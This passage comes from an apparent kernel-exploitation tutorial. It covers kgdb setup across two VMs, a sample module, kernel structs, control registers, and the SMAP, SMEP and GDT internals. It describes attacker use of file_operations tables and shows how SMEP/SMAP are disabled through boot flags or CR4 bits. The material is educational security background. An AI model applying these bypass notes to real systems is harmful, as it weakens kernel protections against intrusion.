Search for the first ‘<em>Debian GNU</em>’ occurence and make sure it’s the wanted kernel, and add the following to the line starting with [X]: <em>kgdboc=ttyS1,115200 kgdbwait nokaslr</em>.</p>
<pre><code class="lang-auto">menuentry 'Debian GNU/Linux' --class debian --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-simple-b1a66d11-d729-4f23-99b0-4ddfea0af6c5' {
	...
	echo	'Loading Linux 4.17.0 ...'
	[X] linux	/boot/vmlinuz-4.17.0 root=UUID=b1a66d11-d729-4f23-99b0-4ddfea0af6c5 ro quiet kgdboc=ttyS1,115200 kgdbwait nokaslr
	echo	'Loading initial ramdisk ...'
	initrd	/boot/initrd.img-4.17.0
}
</code></pre>
<p>In order to debug the running kernel, another VM similer to the one made previously(<em>Debian</em>) will be created(<em>Debian HOST</em>).<br>
Now shutdown both VMs in order to set the pipe:</p>
<ul>
<li>
<em>Debian</em>:<pre><code class="lang-auto">⦿ Use named pipe:
	*---------------------------------------*
	| \\.\pipe\com_2                        |
	*---------------------------------------*
	[This end is the server.             [▼]]
	[The other end is a virtual machine. [▼]]
---------------------------------------------7
I/O mode
⧆ Yield CPU on poll

	Allow the guest operating system to use this serial
	port in polled mode (as opposed to interrupt mode).
</code></pre>
</li>
<li>
<em>DebianHOST</em>:<pre><code class="lang-auto">⦿ Use named pipe:
	*---------------------------------------*
	| \\.\pipe\com_2                        |
	*---------------------------------------*
	[This end is the client.             [▼]]
	[The other end is a virtual machine. [▼]]
---------------------------------------------7
I/O mode
⧆ Yield CPU on poll

	Allow the guest operating system to use this serial
	port in polled mode (as opposed to interrupt mode).
</code></pre>
</li>
</ul>
<p>Getting the <strong>vmlinux</strong> image to <em>DebianHOST</em> after installing necessary packages:</p>
<pre><code class="lang-bash">root@Nwwz:~# apt-get install gcc gdb git net-tools
root@Nwwz:~# cd /home/user
root@Nwwz:/home/user# ls
vmlinux
root@Nwwz:/home/user# gdb vmlinux
GNU gdb (Debian 7.12-6) 7.12.0.20161007-git
(SNIP)
</code></pre>
<p>Turning the Debian back on would result in a similiar message:</p>
<pre><code class="lang-auto">KASLR disabled: 'nokaslr' on cmdline.
[	1.571915] KGDB: Waiting for connection from remote gdb...
</code></pre>
<p>Attaching to DebianHOST’s GDB is then possible:</p>
<pre><code class="lang-auto">(gdb) set serial baud 115200
(gdb) target remote /dev/ttyS1
Remote debugging using /dev/ttyS1
kgdb_breakpoint () at kernel/debug/debug_core.c:1073
1073		wmb(); /* Sync point after breakpoint */
(gdb) list
1068	noinline void kgdb_breakpoint(void)
1069	{
1070		atomic_inc(&amp;kgdb_setting_breakpoint);
1071		wmb(); /* Sync point before breakpoint */
1072		arch_kgdb_breakpoint();
1073		wmb(); /* Sync point after breakpoint */
1074		atomic_dec(&amp;kgdb_setting_breakpoint);
1075	}
1076	EXPORT_SYMBOL_GPL(kgdb_breakpoint);
1077
(gdb)
</code></pre>
<p>Know that by writing <em>‘continue’</em> on <em>GDB</em>, you wouldn’t be able to control it again unless you use the <em>magic SysRq key</em> to force a <em>SIGTRAP</em> to happen:</p>
<pre><code class="lang-bash">root@Nwwz:~# echo "g" &gt; /proc/sysrq-trigger
</code></pre>
<p>And you can see in <em>DebianHOST</em> that it works.</p>
<pre><code class="lang-bash">(SNIP)
[New Thread 459]
[New Thread 462]
[New Thread 463]
[New Thread 476]
[New Thread 485]
[New Thread 487]

Thread 56 received signal SIGTRAP, Trace/breakpoint trap.
[Switching to Thread 489]
kgdb_breakpoint () at kernel/debug/debug_core.c:1073
1073	wmb(); /* Sync point after breakpoint */
(gdb)
</code></pre>
<h5>Compiling a simple module:</h5>
<p>A simple Hello 0x00sec module would be created.<br>
We need to make a directory in root folder, and prepare two files:</p>
<pre><code class="lang-bash">root@Nwwz:~# mkdir mod
root@Nwwz:~# cd mod
root@Nwwz:~/mod/# nano hello.c
</code></pre>
<pre><code class="lang-auto">#include &lt;linux/init.h&gt;
#include &lt;linux/module.h&gt;

static void hello_exit(void){
	printk(KERN_INFO "Goodbye!\n");
}

static int hello_init(void){
	printk(KERN_INFO "Hello 0x00sec!\n");
	return 0;
}
MODULE_LICENSE("GPU");

module_init(hello_init);
module_exit(hello_exit);
</code></pre>
<pre><code class="lang-bash">root@Nwwz:~/mod/# nano Makefile
</code></pre>
<pre><code class="lang-auto">obj-m += hello.o
KDIR   = /lib/modules/$(shell uname -r)/build

all:
	make -C $(KDIR) M=$(PWD) modules
clean:
	rm -rf *.ko *.o *.mod.* *.symvers *.order
</code></pre>
<p>Then, one can start compiling using <em>‘make’</em> and insert/remove the module in kernel to trigger both init and exit handlers.</p>
<pre><code class="lang-auto">root@Nwwz:~/mod# make
make -c /lib/modules/4.17.0/build M=/root/mod modules
make[1]: Entering directory '/usr/src/linux-4.17.2'
	CC [M]	/root/mod/hello.o
	Building modules, stage 2.
	MODPOST 1 modules
	CC	/root/mod/hello.mod.o
	LD [M] /root/mod/hello.ko
make[1]: Leaving directory '/usr/src/linux-4.17.2'
root@Nwwz:~/mod# insmod hello.ko
root@Nwwz:~/mod# rmmod hello.ko
</code></pre>
<p>The messages would be by then saved in the <em>dmesg</em> circular buffer.</p>
<pre><code class="lang-bash">root@Nwwz:~/mod# dmesg | grep Hello
[ 6545.039487] Hello 0x00sec!
root@Nwwz:~/mod# dmesg | grep Good
[ 6574.452282] Goodbye!
</code></pre>
<p>To clean the current directory:</p>
<pre><code class="lang-bash">root@Nwwz:~/mod# make clean
</code></pre>
<h5>What?:</h5>
<p>The kernel doesn’t count on the <em>C library</em> we’ve been used to, because it’s judged useless for it.<br>
So instead, after the module is linked and loaded in kernel-space(<em>requires root privileges, duh</em>).<br>
It can use header files available in the <strong>kernel source tree</strong>, which offers a huge number of functions such as <em>printk()</em> which logs the message and sets it’s priority, <em>module_init()</em> and <em>module_exit()</em> to declare initialization and clean-up functions.<br>
And while application usually run with no chance of changing their variables by another thread. This<br>
certainly isn’t the case for <em>LKM</em>s, since what they offer could be used by multiple processes at a single time, which could lead(<em>if the data dealt with is sensible, aka in critical region</em>) to a <em>panic</em>, or worse(<em>better?</em>), a <strong>compromise</strong>.</p>
<h5>Few structs:</h5>
<p>The kernel implements multiple locks, only semaphores and spinlocks will likely be used here.<br>
When the <em>semaphore</em> is previously held, the thread will <em>sleep</em>, <em>waiting for the lock to be released</em> so he can <em>claim it</em>.<br>
That’s why it’s a <em>sleeping lock</em>, therefore, it’s only used in <em>process context</em>.</p>
<pre><code class="lang-auto">/* Please don't access any members of this structure directly */
struct semaphore {
	raw_spinlock_t		lock;
	unsigned int		count;
	struct list_head	wait_list;
};
</code></pre>
<p>It can then be initialized with sema_init() or DEFINE_SEMAPHORE():</p>
<pre><code class="lang-auto">#define __SEMAPHORE_INITIALIZER(name, n)				\
{									\
	.lock		= __RAW_SPIN_LOCK_UNLOCKED((name).lock),	\
	.count		= n,						\
	.wait_list	= LIST_HEAD_INIT((name).wait_list),		\
}

static inline void sema_init(struct semaphore *sem, int val)
{
	static struct lock_class_key __key;
	*sem = (struct semaphore) __SEMAPHORE_INITIALIZER(*sem, val);
	lockdep_init_map(&amp;sem-&gt;lock.dep_map, "semaphore-&gt;lock", &amp;__key, 0);
}
</code></pre>
<p>With <em>val</em> being the <em>much processes</em> that can <em>hold the lock</em> at once.<br>
It’s normally set to <em>1</em>, and a semaphore with a count of <em>1</em> is called a <em>mutex</em>.<br>
Another type of locks would be <em>spinlocks</em>, it keeps the <em>thread spinning instead of sleeping</em>, for that reason, it can be used in the <em>interrupt context</em>.</p>
<pre><code class="lang-auto">typedef struct spinlock {
	union {
		struct raw_spinlock rlock;

#ifdef CONFIG_DEBUG_LOCK_ALLOC
# define LOCK_PADSIZE (offsetof(struct raw_spinlock, dep_map))
		struct {
			u8 __padding[LOCK_PADSIZE];
			struct lockdep_map dep_map;
		};
#endif
	};
} spinlock_t;


#define __RAW_SPIN_LOCK_INITIALIZER(lockname)	\
	{					\
	.raw_lock = __ARCH_SPIN_LOCK_UNLOCKED,	\
	SPIN_DEBUG_INIT(lockname)		\
	SPIN_DEP_MAP_INIT(lockname) }

#define __RAW_SPIN_LOCK_UNLOCKED(lockname)	\
	(raw_spinlock_t) __RAW_SPIN_LOCK_INITIALIZER(lockname)

# define raw_spin_lock_init(lock)				\
	do { *(lock) = __RAW_SPIN_LOCK_UNLOCKED(lock); } while (0)
#endif

static __always_inline raw_spinlock_t *spinlock_check(spinlock_t *lock)
{
	return &amp;lock-&gt;rlock;
}

#define spin_lock_init(_lock)				\
do {							\
	spinlock_check(_lock);				\
	raw_spin_lock_init(&amp;(_lock)-&gt;rlock);		\
} while (0)
</code></pre>
<p>Enough with locks, what about <em>file_operations</em>?<br>
This struct holds the <em>possible operations</em> that can be called on a <em>device/file/entry</em>.<br>
When creating a <em>character device</em> by directly calling <em>cdev_alloc()</em> or <em>misc_register()</em>, it has to be provided along with the <em>major</em>(<em>on first function only</em>) and <em>minor</em>.<br>
It is defined as follows:</p>
<pre><code class="lang-auto">struct file_operations {
	struct module *owner;
	loff_t (*llseek) (struct file *, loff_t, int);
	ssize_t (*read) (struct file *, char __user *, size_t, loff_t *);
	ssize_t (*write) (struct file *, const char __user *, size_t, loff_t *);
	...
} __randomize_layout;
</code></pre>
<p>There are similiar structs too, such as <em>inode_operations</em>, <em>block_device_operations</em> and <em>tty_operations</em>…<br>
But they all provide <em>handlers</em> to <em>userspace function</em> if the file/inode/blockdev/tty is the target.<br>
These are sometimes used by the attacker in order to <em>redirect execution</em> such as <em>perf_fops</em> or <em>ptmx_fops</em>.</p>
<p>The kernel provides some structs for lists with different <em>search times</em>.<br>
The first being <em>double linked-list</em>, <em>list_head</em>, it’s definition is simple, pointing to the <em>next</em> and <em>previous</em> <em>list_head</em>.</p>
<pre><code class="lang-auto">struct list_head {
	struct list_head *next, *prev;
};
</code></pre>
<p>While the second is redblack tree, <em>rb_node</em>, provides better <em>search time</em>.</p>
<pre><code class="lang-auto">struct rb_node {
	unsigned long  __rb_parent_color;
	struct rb_node *rb_right;
	struct rb_node *rb_left;
} __attribute__((aligned(sizeof(long))));
</code></pre>
<p>It can be used to find the <em>target value</em> faster, if it’s <em>bigger</em> than the <em>first node</em>(<em>head</em>), then go <em>right</em>, else, go <em>left</em>.<br>
Function <em>container_of()</em> can then be used to extract the <em>container struct</em>.<br>
Note: Each device, can have multiple <em>minors</em>, but it’ll necessarily have a single <em>major</em>.</p>
<pre><code class="lang-bash">root@Nwwz:/# cd /dev
root@Nwwz:/dev# ls -l
total 0
crw------- 1 root root    [10], 175 Feb  9 09:24 agpgart
                            |
                            *-&gt; Same major, different minors.
                            |							
crw-r--r-- 1 root root    [10], 235 Feb  9 09:24 autofs
drwxr-xr-x 2 root root         160 Feb  9 09:24 block
drwxr-xr-x 2 root root          80 Feb  9 09:24 bsg
(SNIP)
[c]rw-rw-rw- 1 root tty      [5], [2] Feb  9 12:06 ptmx
|                             |    |
|                             |    *--&gt; Minor
*---&gt; Character Device        *---&gt; Major
(SNIP)
[b]rw-rw---- 1 root cdrom    [11], [0] Feb  9 09:24 sr0
|                             |    |
|                             |    *--&gt; Minor
*---&gt; Block Device            *---&gt; Major
(SNIP)
</code></pre>
<h5>Debug a module:</h5>
<p>When we started <em>gdb</em>, the only image it was aware of, is the <em>vmlinux</em> one.<br>
It doesn’t know about the <em>loaded module</em>, and doesn’t know about the <em>load location</em>.<br>
In order to provide these things and make debugging the module possible, one has to first transfer<br>
the target module to <em>DebianHOST</em>.</p>
<pre><code class="lang-bash">root@Nwwz:~/mod# service ssh start
</code></pre>
<p>Once that’s done, one should find different sections and addresses of the LKM in memory:</p>
<pre><code class="lang-bash">root@Nwwz:~/mod# insmod simple.ko
root@Nwwz:~/mod# cd /sys/module/simple/sections
root@Nwwz:/sys/module/simple/sections# ls -la
total 0
drwxr-xr-x 2 root root	   0 Aug 11 06:30 .
drwxr-xr-x 5 root root	   0 Aug  2 17:55 ..
-r-------- 1 root root	4096 Aug 11 06:31 .bss
-r-------- 1 root root	4096 Aug 11 06:31 .data
-r-------- 1 root root	4096 Aug 11 06:31 .gnu.linkonce.this_module
-r-------- 1 root root	4096 Aug 11 06:31 __mcount_loc
-r-------- 1 root root	4096 Aug 11 06:31 .note.gnu.build-id
-r-------- 1 root root	4096 Aug 11 06:31 .orc_unwind
-r-------- 1 root root	4096 Aug 11 06:31 .orc_unwind_ip
-r-------- 1 root root	4096 Aug 11 06:31 .rodata.str1.1
-r-------- 1 root root	4096 Aug 11 06:31 .rodata.str1.8
-r-------- 1 root root	4096 Aug 11 06:31 .strtab
-r-------- 1 root root	4096 Aug 11 06:31 .symtab
-r-------- 1 root root	4096 Aug 11 06:31 .text
root@Nwwz:/sys/module/simple/sections# cat .text
0xffffffffc054c000
root@Nwwz:/sys/module/simple/sections# cat .data
0xffffffffc054e000
root@Nwwz:/sys/module/simple/sections# cat .bss
0xffffffffc054e4c0
</code></pre>
<p>Back to <em>DebianHOST</em> and in gdb:</p>
<pre><code class="lang-python">(gdb) add-symbol-file simple.ko 0xffffffffc054c000 -s .data 0xffffffffc054e000 -s .bss 0xffffffffc054e4c0
</code></pre>
<p>And that’s it.</p>
<h4>Chapter II: <em>Overview on security and General understanding</em>
</h4>
<p>“<em>Uuuuh, it’s simple?</em>”</p>
<h5>Control Registers:</h5>
<p>CRs are <em>special registers</em>, being <em>invisible</em> to the <em>user</em>, they hold <em>important</em> information on the current <em>CPU</em> and the <em>process</em> running on it.<br>
<strong>x86_32 and x86_64</strong>:<br>
Keep in mind that their <em>sizes</em> are <em>different</em>(<em>64bit for x86_64, 32bit for x86_32</em>).<br>
<em>CR0</em>:</p>
<pre><code class="lang-bash">x32 and x64:
#0:     PE(Protected Mode Enable)
#1:     MP(Monitor co-processor)
#2:     EM(Emulation)
#3:     TS(Task Switched)
#4:     ET(Extension Type)
#5:     NE(Numeric Error)
#6-15:  Reserved
#16:    WP(Write Protect)
#17:    Reserved
#18:    AM(Alignment Mask)
#19-28: Reserved
#29:    NW(Not-Write Through)
#30:    CD(Cache Disable)
#31:    PG(Paging)
x64 only:
#32-61: Reserved
</code></pre>
<p><em>CR2</em>:<br>
Solely containing the <em>PFLA</em>(<em>Page Fault Linear Address</em>) address, which would later be extracted using <em>do_page_fault</em> function and passed to <em>__do_page_fault</em> to handle it.</p>
<pre><code class="lang-auto">dotraplinkage void notrace
do_page_fault(struct pt_regs *regs, unsigned long error_code)
{
	unsigned long address = read_cr2(); /* Get the faulting address */
	enum ctx_state prev_state;

	prev_state = exception_enter();
	if (trace_pagefault_enabled())
		trace_page_fault_entries(address, regs, error_code);

	__do_page_fault(regs, error_code, address);
	exception_exit(prev_state);
}
NOKPROBE_SYMBOL(do_page_fault);
</code></pre>
<p><em>CR3</em>:<br>
This register contains the physical address of the <em>current process</em> PGD(<em>Page Global Directory</em>), which(<em>once converted back to virtual address</em>) would link to the next <em>level</em>(<em>P4D on five-level page tables</em> or <em>PUD on four-level page tables</em>), but in the end, it’s all to find the same struct, that is, <em>struct page</em>.</p>
<pre><code class="lang-auto">static inline unsigned long read_cr3_pa(void)
{
	return __read_cr3() &amp; CR3_ADDR_MASK;
}

static inline unsigned long native_read_cr3_pa(void)
{
	return __native_read_cr3() &amp; CR3_ADDR_MASK;
}

static inline void load_cr3(pgd_t *pgdir)
{
	write_cr3(__sme_pa(pgdir));
}
</code></pre>
<p>This is called as an example when an Oops happens, and the kernel calls <em>dump_pagetable()</em>.<br>
<em>CR4</em>:</p>
<pre><code class="lang-bash">x32 and x64:
#0:     VME(Virtual-8086 Mode Extensions)
#1:     PVI(Protected Mode Virtual Interrupts)
#2:     TSD(Time Stamp Disable)
#3:     DE(Debugging Extensions)
#4:     PSE(Page Size Extensions)
#5:     PAE(Physical Address Extensions)
#6:     MCE(Machine Check Enable)
#7:     PGE(Page Global Enable)
#8:     PCE(Performance-Monitoring Counter Enable)
#9:     OSFXSR(OS Support for FXSAVE and FXRSTOR Instructions)
#10:    OSXMMEXCPT(OS Support for Unmasked SIMD Floating Point Exceptions)
#11:    UMIP(User-Mode Instruction Prevention)
#12:    Reserved
#13:    VMXE(Virtual Machine Extensions Enable)
#14:    SMXE(Safer Mode Extensions Enable)
#15-16: Reserved
#17:    PCIDE(PCID Enable)
#18:    OSXSAVE(XSAVE and Processor Extended States Enable)
#19:    Reserved
#20:    SMEP(Supervisor Mode Execution Prevention)
#21:    SMAP(Supervisor Mode Access Prevention)
#22-31: Reserved
x64 only:
#31-63: Reserved
</code></pre>
<p><em>CR1</em> and <em>CR5</em> to <em>CR7</em>:<br>
Marked as <em>reserved</em>, accessing them would result in raising the <em>Undefined Behavior</em>(<strong><span class="hashtag">#UD</span></strong>) exception.<br>
<strong>x86_64 only</strong>:<br>
<em>CR8</em>:<br>
Only the first 4 bits are used in this one, while the other 60 bits are <em>reserved(0)</em>.<br>
Also called <em>TPR</em>(<em>Task Priority Register</em>). Those 4 bits are used when servicing interrupts, checking if the task should really be interrupted. It may or may not, depending on the interrupt’s priority: (<em>IP &lt;= TP</em> ? <em>PASS</em>:<strong>SERVICE</strong>).</p>
<p>They differ from architecture to another, while the previous example reviewed two CISC(<em>x86_32</em>, <em>x86_64</em>). <em>Windows</em> itself does have much similiarities at this level:<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/3/37a721645c4241ca5904b248c8286667964e4790.png" alt="image" data-base62-sha1="7WkkQivFFlX8xG0EJLmv4WqrKjS" width="690" height="402"><br>
The thing is a little bit more different in RISC(<em>ARM</em> for this example):<br>
Instead of <em>Control Registers</em>, they are named <em>Coprocessors</em>(<em>P0</em> to <em>P15</em>), each <em>Coprocessor</em> holds <em>16</em> registers(<em>C0</em> to <em>C15</em>). Note however, that only <em>CP14</em> and <em>CP15</em> are very important to the <em>system</em>.<br>
<em>MCR</em> and <em>MRC</em> Instructions are available to deal with data transfer(<em>read/write</em>).<br>
An example for the <em>TTBR</em>(<em>Translation Table Base Register</em>) is as follows:<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/8/89757594c8563a79137d4348a67bb1e3314a8615.png" alt="image" data-base62-sha1="jC14gDx9ZZjKpaK1oDzZksdxIrj" width="690" height="29"></p>
<h5>SMAP:</h5>
<p>Stands for <em>Supervisor Mode Access Prevention</em>, as it’s name suggests, prevents access to user-space from a more <em>privileged context</em>, that is, <em>ring zero</em>. However, since access may still be necessary in certain occasions, a flag is dedicated(<em>AC in EFLAGS</em>) to this purpose, along with two instructions to <em>set</em> or <em>clear</em> it:<br>
<em>CLAC</em>:<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/d/df2e144659b9f0c2b3382f8c7759087babd5d221.png" alt="image" data-base62-sha1="vQlcpknsX4fWsGJk9ji6eNFA21b" width="690" height="83"><br>
<em>STAC</em>:<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/7/7ece672cd78f62bfc62465ad510be6e73c16696a.png" alt="image" data-base62-sha1="i5MnpYkZnj3JOkcaRNCAL5HCOFk" width="690" height="86"></p>
<pre><code class="lang-auto">static __init int setup_disable_smap(char *arg)
{
	setup_clear_cpu_cap(X86_FEATURE_SMAP);
	return 1;
}
__setup("nosmap", setup_disable_smap);
</code></pre>
<p>It can be disabled with <em>nosmap</em> boot flag, which would clear the CPU’s <em>SMAP</em> capability, or by unsetting the <em>SMAP bit</em>(<em><span class="hashtag">#21</span></em>) on <em>CR4</em>.</p>
<h5>SMEP:</h5>
<p>An abbreviation for <em>Supervisor Mode Execution Prevention</em>, when running on <em>ring zero</em>, execution would not be allowed to be transmitted to <em>user-space</em>. So both <em>SMEP</em> and <em>SMAP</em> put a form of limitation on the <em>attacker’s</em> surface.</p>
<pre><code class="lang-auto">static __init int setup_disable_smep(char *arg)
{
	setup_clear_cpu_cap(X86_FEATURE_SMEP);
	
	check_mpx_erratum(&amp;boot_cpu_data);
	return 1;
}
__setup("nosmep", setup_disable_smep);
</code></pre>
<p>Knowing if it’s on is as simple as checking <em>/proc/cpuinfo</em>, and it’s the same for <em>SMAP</em>.<br>
This protection can be disabled with <em>nosmep</em> boot flag, it can also be disabled during runtime by unsetting <em>SMEP bit</em>(<em><span class="hashtag">#20</span></em>) on <em>CR4</em>.</p>
<h5>Write-Protect:</h5>
<p>Since code executing at the highest level of privilege should normally be capable of writting to all pages even those marked as <em>RO</em>(<em>Read Only</em>). However, a bit in <em>CR0</em>(<em>WP bit(16th)</em>) is supposed to stop that from happening, by providing additional checks.</p>
<h5>Paging(a bit of segmentation too):</h5>
<p>Linux does separate privileges. the processor can handle up to 4 different rings, starting from <strong>0</strong> which obviously is the <em>most privileged</em> and ending with <strong>3</strong> being the <em>least privileged</em> with limited access to <em>system resources</em>. However, most operating systems do work with only two rings, zero(also called <em>kernel-space</em>) and three(or <em>user-space</em>).<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/d/ddf4ff854f521b78e5c9f9b17c6dcd9defaa88a5.png" alt="image" data-base62-sha1="vFwqtwYnSRFoW3nUoUrVt2NT1UV" width="353" height="215"><br>
Each running process does have a <strong>struct mm_struct</strong> which fully describes it’s virtual memory space.<br>
But when it comes to <em>segmentation</em> and <em>paging</em>, we’re only interested in few objects in this struct: <em>context</em>, the single-linked list <em>mmap</em> and <em>pgd</em>.</p>
<pre><code class="lang-auto">typedef struct {

	u64 ctx_id;

	atomic64_t tlb_gen;

#ifdef CONFIG_MODIFY_LDT_SYSCALL
	struct rw_semaphore	ldt_usr_sem;
	struct ldt_struct	*ldt;
#endif

#ifdef CONFIG_X86_64
	unsigned short ia32_compat;
#endif

	struct mutex lock;
	void __user *vdso;
	const struct vdso_image *vdso_image;

	atomic_t perf_rdpmc_allowed;
#ifdef CONFIG_X86_INTEL_MEMORY_PROTECTION_KEYS

	u16 pkey_allocation_map;
	s16 execute_only_pkey;
#endif
#ifdef CONFIG_X86_INTEL_MPX
	void __user *bd_addr;
#endif
} mm_context_t;
</code></pre>
<p>This struct holds many information on the context, including the <em>Local descriptor table(LDT)</em>, the VDSO image and base address(<em>residing in user-space <strong>__user</strong></em>), a <em>read/write semaphore</em> and a <em>mutual exclusion lock</em>(<em>it’s a semaphore too, remember?</em>).</p>
<pre><code class="lang-auto">struct ldt_struct {

	struct desc_struct	*entries;
	unsigned int		nr_entries;

	int			slot;
};
</code></pre>
<p>The first element in the LDT is a <em>desc_struct</em> pointer, referencing an array of entries, <em>nr_entries</em> of them.<br>
However, know that <em>LDT</em> isn’t usually set up, it would only use the <em>Global Descriptor Table</em>, it’s enough for <em>most</em> processes.</p>
<pre><code class="lang-auto">DEFINE_PER_CPU_PAGE_ALIGNED(struct gdt_page, gdt_page) = { .gdt = {
#ifdef CONFIG_X86_64
	[GDT_ENTRY_KERNEL32_CS]		= GDT_ENTRY_INIT(0xc09b, 0, 0xfffff),
	[GDT_ENTRY_KERNEL_CS]		= GDT_ENTRY_INIT(0xa09b, 0, 0xfffff),
	[GDT_ENTRY_KERNEL_DS]		= GDT_ENTRY_INIT(0xc093, 0, 0xfffff),
	[GDT_ENTRY_DEFAULT_USER32_CS]	= GDT_ENTRY_INIT(0xc0fb, 0, 0xfffff),
	[GDT_ENTRY_DEFAULT_USER_DS]	= GDT_ENTRY_INIT(0xc0f3, 0, 0xfffff),
	[GDT_ENTRY_DEFAULT_USER_CS]	= GDT_ENTRY_INIT(0xa0fb, 0, 0xfffff),
#else
	[GDT_ENTRY_KERNEL_CS]		= GDT_ENTRY_INIT(0xc09a, 0, 0xfffff),
	[GDT_ENTRY_KERNEL_DS]		= GDT_ENTRY_INIT(0xc092, 0, 0xfffff),
	[GDT_ENTRY_DEFAULT_USER_CS]	= GDT_ENTRY_INIT(0xc0fa, 0, 0xfffff),
	[GDT_ENTRY_DEFAULT_USER_DS]	= GDT_ENTRY_INIT(0xc0f2, 0, 0xfffff),
	[GDT_ENTRY_PNPBIOS_CS32]	= GDT_ENTRY_INIT(0x409a, 0, 0xffff),
	[GDT_ENTRY_PNPBIOS_CS16]	= GDT_ENTRY_INIT(0x009a, 0, 0xffff),
	[GDT_ENTRY_PNPBIOS_DS]		= GDT_ENTRY_INIT(0x0092, 0, 0xffff),
	[GDT_ENTRY_PNPBIOS_TS1]		= GDT_ENTRY_INIT(0x0092, 0, 0),
	[GDT_ENTRY_PNPBIOS_TS2]		= GDT_ENTRY_INIT(0x0092, 0, 0),
	[GDT_ENTRY_APMBIOS_BASE]	= GDT_ENTRY_INIT(0x409a, 0, 0xffff),
	[GDT_ENTRY_APMBIOS_BASE+1]	= GDT_ENTRY_INIT(0x009a, 0, 0xffff),
	[GDT_ENTRY_APMBIOS_BASE+2]	= GDT_ENTRY_INIT(0x4092, 0, 0xffff),

	[GDT_ENTRY_ESPFIX_SS]		= GDT_ENTRY_INIT(0xc092, 0, 0xfffff),
	[GDT_ENTRY_PERCPU]		= GDT_ENTRY_INIT(0xc092, 0, 0xfffff),
	GDT_STACK_CANARY_INIT
#endif
} };
EXPORT_PER_CPU_SYMBOL_GPL(gdt_page);
</code></pre>
<p>A per-cpu variable <em>gdt_page</em> is initialized using the <em>GDT_ENTRY_INIT</em> macro.</p>
<pre><code class="lang-auto">#define GDT_ENTRY_INIT(flags, base, limit)			\
	{							\
		.limit0		= (u16) (limit),		\
		.limit1		= ((limit) &gt;&gt; 16) &amp; 0x0F,	\
		.base0		= (u16) (base),			\
		.base1		= ((base) &gt;&gt; 16) &amp; 0xFF,	\
		.base2		= ((base) &gt;&gt; 24) &amp; 0xFF,	\
		.type		= (flags &amp; 0x0f),		\
		.s		= (flags &gt;&gt; 4) &amp; 0x01,		\
		.dpl		= (flags &gt;&gt; 5) &amp; 0x03,		\
		.p		= (flags &gt;&gt; 7) &amp; 0x01,		\
		.avl		= (flags &gt;&gt; 12) &amp; 0x01,		\
		.l		= (flags &gt;&gt; 13) &amp; 0x01,		\
		.d		= (flags &gt;&gt; 14) &amp; 0x01,		\
		.g		= (flags &gt;&gt; 15) &amp; 0x01,		\
	}
</code></pre>
<p>This macro simply takes <em>three arguments</em>, and <em>splits them</em> in order to <em>store</em> at each <em>field</em> a <em>valid value</em>.<br>
The <em>GDT</em> holds more entries on <em>32bit</em> than on <em>64bit</em>.</p>
<pre><code class="lang-auto">struct gdt_page {
	struct desc_struct gdt[GDT_ENTRIES];
} __attribute__((aligned(PAGE_SIZE)));
</code></pre>
<p>Says that <em>gdt_page</em> is an array of <em>GDT_ENTRIES</em>(<em>32</em> on <em>x86_32</em>, <em>16</em> on <em>x86_64</em>) much of <em>desc_struct</em> aligned to <em>PAGE_SIZE</em>(<em>usually 4KB(4096)</em>).</p>
<pre><code class="lang-auto">struct desc_struct {
	u16	limit0;
	u16	base0;
	u16	base1: 8, type: 4, s: 1, dpl: 2, p: 1;
	u16	limit1: 4, avl: 1, l: 1, d: 1, g: 1, base2: 8;
} __attribute__((packed));
</code></pre>
<p>When an ELF is about to run, and is being loaded with <em>load_elf_binary()</em>, it does call <em>setup_new_exec()</em>, <em>install_exec_creds()</em> on <em>bprm</em> before it calls <em>setup_arg_pages()</em> which would pick a <em>random stack pointer</em>.<br>
Before returning <em>successfully</em>, it would call <em>finalize_exec()</em> and <em>start_thread()</em> which would <em>update the stack’s rlimit</em> and <em>begin execution</em> respectively:</p>
<pre><code class="lang-auto">void
start_thread(struct pt_regs *regs, unsigned long new_ip, unsigned long new_sp)
{
	start_thread_common(regs, new_ip, new_sp,
			    __USER_CS, __USER_DS, 0);
}
EXPORT_SYMBOL_GPL(start_thread);
</code></pre>
<p>As you are able to see, this function is just a wrapper around <em>start_thread_common()</em>:</p>
<pre><code class="lang-auto">static void
start_thread_common(struct pt_regs *regs, unsigned long new_ip,
		    unsigned long new_sp,
		    unsigned int _cs, unsigned int _ss, unsigned int _ds)
{
	WARN_ON_ONCE(regs != current_pt_regs());

	if (static_cpu_has(X86_BUG_NULL_SEG)) {

		loadsegment(fs, __USER_DS);
		load_gs_index(__USER_DS);
	}

	loadsegment(fs, 0);
	loadsegment(es, _ds);
	loadsegment(ds, _ds);
	load_gs_index(0);

	regs-&gt;ip		= new_ip;
	regs-&gt;sp		= new_sp;
	regs-&gt;cs		= _cs;
	regs-&gt;ss		= _ss;
	regs-&gt;flags		= X86_EFLAGS_IF;
	force_iret();
}
</code></pre>
<p>As a conclusion, every process starts with default segment registers, but different GPRs, stack and instruction pointer, and by looking at <strong>__USER_DS</strong> and <strong>__USER_CS</strong>:</p>
<pre><code class="lang-auto">#define GDT_ENTRY_DEFAULT_USER_DS	5
#define GDT_ENTRY_DEFAULT_USER_CS	6

#define __USER_DS			(GDT_ENTRY_DEFAULT_USER_DS*8 + 3)
#define __USER_CS			(GDT_ENTRY_DEFAULT_USER_CS*8 + 3)
</code></pre>
<p>We would find the segment registers and their values on <em>user-space</em>:</p>
<pre><code class="lang-auto">Initial state:
CS = 6*8+3 = 0x33
SS = 5*8+3 = 0x2b
DS = FS = ES = 0
</code></pre>
<p>These values can be checked using <em>GDB</em> and a <em>dummy binary</em>.</p>
<pre><code class="lang-bash">(gdb) b* main
Breakpoint 1 at 0x6b0
(gdb) r
Starting program: /root/mod/cs

Breakpoint 1, 0x00005555555546b0 in main ()
(gdb) info reg cs ss
cs		0x33	51
ss		0x2b	43
</code></pre>
<p>Also, you should know that, CS holds in it’s least 2 significant bits, the <em>Current Privilege Level(CPL)</em>, other segment selectors hold the <em>Requested Privilege Level(RPL)</em> instead of <em>CPL</em>.</p>
<pre><code class="lang-bash">(gdb) p/t $cs
$1 = 110011
(gdb) p/x $cs &amp; 0b11
$2 = 0x3
# (Privilege Level: User(3) SuperUser(0))
(gdb) p/d $cs &amp; ~0b1111
$3 = 48
# (Table Offset: 48)
(gdb) p/d $cs &amp; 0b100
$4 = 0
